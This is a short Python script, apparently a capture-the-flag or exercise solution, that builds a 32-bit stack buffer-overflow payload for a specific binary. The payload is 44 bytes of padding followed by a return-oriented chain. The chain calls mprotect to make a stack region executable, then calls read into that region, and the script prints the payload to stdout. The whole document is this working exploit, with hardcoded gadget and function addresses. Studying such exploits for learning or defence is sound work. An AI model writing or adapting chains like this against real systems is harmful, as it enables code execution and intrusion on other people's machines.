import struct
import sys


def p32(x):
    return struct.pack("<I", x)


stack = p32(0xFFFDD000)
size = p32(0x10000)
perm = p32(0x7)
mprot = p32(0x80523E0)
offset = 44
pop3ret = p32(0x8048882)
read = p32(0x80517F0)


payload = b""
payload += b"A" * offset
payload += mprot
payload += pop3ret
payload += stack
payload += size
payload += perm

## read syscall
payload += read
payload += stack
payload += p32(0x0)
payload += stack
payload += p32(400)


sys.stdout.buffer.write(payload + b"\n")
